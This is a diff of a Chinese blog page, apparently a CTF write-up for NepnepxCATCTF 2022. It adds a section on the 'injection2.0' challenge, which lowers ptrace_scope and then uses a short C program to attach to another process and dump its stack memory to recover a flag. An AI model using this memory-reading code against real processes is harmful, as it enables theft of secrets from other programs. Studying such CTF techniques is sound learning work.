@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://nqoinaen.github.io/img/img16.jpg">
 <meta property="article:published_time" content="2023-01-01T12:02:07.000Z">
-<meta property="article:modified_time" content="2023-01-02T02:14:49.495Z">
+<meta property="article:modified_time" content="2023-01-06T05:06:18.283Z">
 <meta property="article:author" content="nqoinaen">
 <meta property="article:tag" content="kernel">
 <meta property="article:tag" content="ret2usr">
@@ -253,7 +253,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.9k 字
+          7k 字
         
       </span>
     
@@ -264,7 +264,7 @@
         
         
         
-          13 分钟
+          15 分钟
         
       </span>
     
@@ -315,7 +315,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年1月2日 上午
+                    本文最后更新于：2023年1月6日 下午
                   
                 
               </p>
@@ -324,12 +324,10 @@
               <div class="markdown-body">
                 
                 <h2 id="前言：">前言：</h2>
-<p>认真打了一下NepnepxCATCTF，还是挺有参与感的，2023新年快乐！</p>
+<p>认真打了一下NepnepxCATCTF，还是挺有参与感的，2023新年快乐！（<strong>1.5</strong>小记：有些pwn题还是要复现下，<a target="_blank" rel="noopener" href="https://www.wolai.com/nepnep/4njXHjpSLx3uPHR2fc6XL7">官方wp</a>）</p>
 <p><img src="/2023/01/01/2022catctfwp/rank.png" srcset="/img/loading.gif" lazyload alt="rank"></p>
 <h2 id="pwn">pwn</h2>
 <h3 id="kernel-test">kernel-test</h3>
-<p>和强网杯2018core太像了,这应该算是最简单的kernel pwn了，不过既然是kernel题我就想仔细讲下</p>
-<p>（这题打包我想吐槽一下，用start.sh打包会产生巨大<code>.img</code>文件，开不起来，我后来拿别的题的文件系统来打包，只需把这题的init和LKM粘贴过去即可）</p>
 <h4 id="0x1保护">0x1保护</h4>
 <p>显然保护只开启kaslr，不过有<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>白给函数地址</p>
 <p><img src="/2023/01/01/2022catctfwp/11.png" srcset="/img/loading.gif" lazyload alt="11"></p>
@@ -370,6 +368,27 @@
 <p>具体就是mov eax,100000001(989681h)</p>
 <p>然后nop填剩余空间</p>
 <p><img src="/2023/01/01/2022catctfwp/2.png" srcset="/img/loading.gif" lazyload alt="2"></p>
+<h3 id="injection2-0-复现">injection2.0(复现)</h3>
+<h4 id="init关键语句：">init关键语句：</h4>
+<p><code>echo 0 | tee /proc/sys/kernel/yama/ptrace_scope</code></p>
+<p>把ptrace_scope从1赋值为0</p>
+<blockquote>
+<p>ptrace_scope是一种安全机制，防止用户访问当前正在运行的进程的内存和状态，这种安全机制可以防止一定的安全问题，如恶意附加进程、读取和修改程序内存等。<br>
+而上述语句则允许了这种情况，相当于我们可以用ptrace附加到其他进程上，进行内存读取，注入等操作</p>
+</blockquote>
+<p><code>./target &gt;pso.file 2&gt;&amp;1 &amp;</code></p>
+<p>运行target程序，并放在后台运行，并把终端输出存放在当前目录下的pso.file文件中</p>
+<p><code>setsid /bin/cttyhack setuidgid 0 /bin/sh</code></p>
+<p>是root用户</p>
+<h4 id="target：">target：</h4>
+<p>把flag存到栈上，死循环打印helloworld</p>
+<p><img src="/2023/01/01/2022catctfwp/17.png" srcset="/img/loading.gif" lazyload alt="17"></p>
+<h4 id="思路：">思路：</h4>
+<p>差不多是跟着写了个用ptrace的内存读取，把栈读出来就好了</p>
+<h4 id="Exp">Exp</h4>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc search_memory.c -static -o exploit</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/wait.h&gt;</span></span><br><br><span class="hljs-comment">//ps -ef</span><br><span class="hljs-comment">//cat /proc/131/maps</span><br><span class="hljs-comment">//how to use: ./exploit pid addr1 addr2</span><br><span class="hljs-comment">//example: ./exploit 131 7ffd252ec000 7ffd2530d000</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc,<span class="hljs-type">char</span> *argv[])</span>&#123;<br>    <span class="hljs-type">int</span> ret=<span class="hljs-number">-1</span>;<br>    <span class="hljs-type">int</span> stat;<br>    <span class="hljs-type">char</span> data=<span class="hljs-number">1</span>;<br>    <span class="hljs-type">size_t</span> addr1,addr2;<br>    <span class="hljs-type">int</span> pid=atoi(argv[<span class="hljs-number">1</span>]);<br>    <span class="hljs-built_in">sscanf</span>(argv[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;%lx&quot;</span>, &amp;addr1);<br>    <span class="hljs-built_in">sscanf</span>(argv[<span class="hljs-number">3</span>], <span class="hljs-string">&quot;%lx&quot;</span>, &amp;addr2);<br><br>    ret=ptrace(PTRACE_ATTACH,pid);<br>    <span class="hljs-keyword">if</span> (ret==<span class="hljs-number">-1</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;attach fail,are you root?\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    wait(&amp;stat);<br>    <span class="hljs-keyword">for</span>(;addr1&lt;addr2;addr1++)<br>    &#123;<br>        data=ptrace(PTRACE_PEEKDATA, pid, addr1,<span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,data);<br><br>    &#125;<br>    ptrace(PTRACE_DETACH,pid);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>本地没flag没内容，打包有些烦，能读出内存来也就不继续搞了</p>
+<p><img src="/2023/01/01/2022catctfwp/16.png" srcset="/img/loading.gif" lazyload alt="16"></p>
 <h2 id="misc">misc</h2>
 <h3 id="MeowMeow">MeowMeow</h3>
 <p><strong>png图片隐写</strong></p>
@@ -480,7 +499,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年1月2日</div>
+          <div>2023年1月6日</div>
         </div>
       
       
